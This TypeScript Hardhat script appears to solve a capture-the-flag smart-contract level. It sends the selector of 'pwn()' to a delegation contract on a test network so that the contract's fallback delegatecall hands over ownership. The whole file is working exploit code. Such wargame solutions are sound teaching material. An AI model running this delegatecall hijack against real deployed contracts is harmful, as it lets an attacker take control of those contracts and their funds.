// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
import { ethers } from "hardhat";
import Web3 from "web3";

async function main() {
  // provider
  const provider = new ethers.providers.AlchemyProvider(
    "rinkeby",
    process.env.ALCHEMY_API_KEY as string
  );

  const web3 = new Web3();
  const attackData = web3.utils.keccak256('pwn()').substr(0, 10) // 0x + first 4 bytes

  const signer = new ethers.Wallet(process.env.RINKEBY_PRIVATE_KEY as string, provider);
  const DELEGATION_CONTRACT_ADDRESS = "0x92c48136E626bAA8285E8b3b7a73CdED3706A9F7"

  const tx = await signer.sendTransaction({
    to: DELEGATION_CONTRACT_ADDRESS,
    data: attackData,
    gasLimit: 100000 // prevent out of gas
  })
  tx.wait(1)

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
